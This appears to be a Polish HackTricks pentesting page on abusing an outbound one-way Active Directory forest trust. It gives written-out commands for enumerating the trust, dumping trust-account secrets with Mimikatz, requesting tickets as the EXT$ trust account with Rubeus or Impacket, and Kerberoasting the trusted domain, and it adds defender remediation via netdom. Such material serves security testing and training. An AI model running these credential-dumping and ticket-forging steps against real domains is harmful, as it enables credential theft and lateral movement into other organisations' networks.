# Zewnętrzna domena lasu - jednokierunkowa (wychodząca)

{{#include ../../banners/hacktricks-training.md}}

W tym scenariuszu **twoja domena** **ufa** pewnym **uprawnieniom** przypisanym do podmiotów z **innej domeny/lasu**.

## Enumeracja

### Trust wychodzący
```bash
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
Jeśli masz dostępny moduł AD, sprawdź także bezpośrednio **Trusted Domain Object (TDO)**. To daje surowe dane zaufania oparte na LDAP, których później będziesz potrzebować, decydując, czy prostszą ścieżką jest **FSP/group abuse** czy **trust-account abuse**:
```powershell
# Enumerate the TDO created for the foreign forest/domain
Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -SearchBase "CN=System,$((Get-ADDomain).DistinguishedName)" -Properties trustDirection,trustType,trustAttributes,flatName,securityIdentifier,whenCreated,whenChanged |
Select Name,flatName,trustDirection,trustType,trustAttributes,securityIdentifier,whenCreated,whenChanged

# Fast trust hygiene check from the outbound side
Get-ADTrust -Identity ext.local -Properties ForestTransitive,SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation
```
Powinieneś także wyliczyć, gdzie foreign principals z `CN=ForeignSecurityPrincipals` faktycznie otrzymały dostęp. Typowe sukcesy to:

- **Local admin** na serwerze/DC w twojej bieżącej domenie
- Membership w **custom domain group**, która ma ACLs nad users/computers/GPOs
- Rights do modyfikacji **computer objects**, które później mogą stać się [RBCD](resource-based-constrained-delegation.md), jeśli konfiguracja trust na to pozwala

## Trust Account Attack

Gdy tworzony jest one-way trust z domeny/forest **B** do domeny/forest **A** (**B trusts A**), w **A** tworzony jest **trust account** dla **B**. W widoku outbound-trust z perspektywy **A** jest to przydatne, ponieważ jeśli później skompromitujesz **B** (stronę trusting), możesz zrzucić tam trust secret i uwierzytelnić się z powrotem do **A** jako `B$`.

Kluczowy aspekt do zrozumienia tutaj jest taki, że password i Kerberos material dla tego trust account można wyekstrahować z Domain Controller w **trusting** domain używając:
```bash
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
To działa, ponieważ konto trust utworzone w **trusted** domain jest włączonym principalem, który ostatecznie ma bazowe uprawnienia zwykłego użytkownika domain. To często wystarcza, aby rozpocząć enumerating LDAP, request tickets i znaleźć kolejny path eskalacji.

W scenariuszu, w którym `ext.local` jest **trusting** domain, a `root.local` jest **trusted** domain, w `root.local` tworzone jest konto użytkownika o nazwie `EXT$`. Dumping trust keys z `ext.local` ujawnia credentials, które można użyć jako `root.local\EXT$` przeciwko `root.local`:
```bash
lsadump::trust /patch
```
Następnie użyj wyciągniętego klucza **RC4**, aby uwierzytelnić się jako `root.local\EXT$` w obrębie `root.local`:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Następnie wylicz zaufaną domenę jako ten principal, na przykład przez Kerberoasting wysokowartościowego SPN w `root.local`:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Z Linux

Jeśli odzyskałeś klucz konta zaufania **RC4**, ten sam pomysł działa z Linux przy użyciu Impacket:
```bash
python getTGT.py -dc-ip dc.root.local root.local/EXT\$ -hashes :<RC4>
export KRB5CCNAME=EXT\$.ccache

# Kerberoast from the trusted domain as the trust account
GetUserSPNs.py -request -k -no-pass -dc-ip dc.root.local root.local/EXT\$ -outputfile root_spns.kerberoast

# Or reduce noise and request only one user
GetUserSPNs.py -request-user svc_sql -k -no-pass -dc-ip dc.root.local root.local/EXT\$
```
Jeśli **RC4** nie jest akceptowany, wróć do odzyskanego **hasła cleartext** (lub wyprowadzonych kluczy **AES**) i ponownie użyj standardowych workflow [Over-Pass-the-Hash / Pass-the-Key](over-pass-the-hash-pass-the-key.md) oraz [Kerberoast](kerberoast.md) z tego foothold.

### Pułapki związane z materiałem kluczy

Nie myl **trust keys** z **trust-account credentials**:

- W one-way trust obie strony przechowują **TDO**, ale faktyczne konto użytkownika **`EXT$` istnieje tylko w trusted domain**.
- Aktualne hasło trust-account jest odzwierciedlone w tajemnicy trust w TDO (`NewPassword` / current trust key).
- Klucz **RC4** trust jest najłatwiejszym artefaktem do ponownego użycia dla `asktgt` jako konto trust; w domyślnych konfiguracjach zwykle jest to działający enctype, ponieważ konto trust często ma pusty `msDS-SupportedEncryptionTypes`.
- Jeśli myślisz w kategoriach **AES trust keys**, pamiętaj, że nie są one wymienne z kluczami AES konta trust, ponieważ różnią się salta.

Dlatego dla techniki z tej strony preferuj albo zrzutowany materiał **RC4**, albo odzyskane hasło **cleartext**.

### Zbieranie cleartext trust password

W poprzednim flow użyto trust hash zamiast **cleartext password** (które jest również **dumped by mimikatz**).

Cleartext password można uzyskać, konwertując wynik \[ CLEAR ] z mimikatz z postaci szesnastkowej i usuwając bajty null `\x00`:

![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be obtained by converting the ( CLEAR ) output from mimikatz from hexadecimal and removing null...](<../../images/image (938).png>)

Czasami podczas tworzenia relacji trust użytkownik musi wpisać hasło dla trust. W tej demonstracji klucz to oryginalne hasło trust, więc jest czytelny dla człowieka. Gdy klucz się rotuje (domyślnie: co 30 dni), cleartext zwykle przestaje być czytelny, ale nadal technicznie da się go użyć.

Cleartext password można wykorzystać do zwykłej autentykacji jako konto trust, jako alternatywę dla żądania TGT przy użyciu Kerberos secret key konta trust. Tutaj, odpytywanie `root.local` z `ext.local` o członków `Domain Admins`:

![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be used to perform regular authentication as the trust account, an alternative to requesting a TGT...](<../../images/image (792).png>)

### Ograniczenia praktyczne

> [!WARNING]
> Trust accounts to niewygodne principals. Interaktywne logowania, takie jak **RUNAS / console / RDP**, nie są tu oczekiwanym sposobem działania, a próby uwierzytelnienia **NTLM** mogą zakończyć się błędem `STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT`. Zamiast tego planuj **Kerberos network logons** (`asktgt`, LDAP, CIFS, Kerberoast).

### Uwaga o persistence / cleanup

Jeśli defenderzy zorientują się, że trusting domain została skompromitowana, powinni zrotować trust secret po **obu stronach** za pomocą `netdom trust ... /resetOneSide ...`. Z perspektywy operatora ma to znaczenie, ponieważ **manual reset natychmiast unieważnia stare trust material**, podczas gdy normalna rotacja trust-password utrzymuje bieżące/poprzednie wartości podczas rollover.
```bash
# Run once from the trusted side
netdom trust root.local /domain:ext.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*

# Run once from the trusting side
netdom trust ext.local /domain:root.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*
```
## References

- [https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust)

{{#include ../../banners/hacktricks-training.md}}
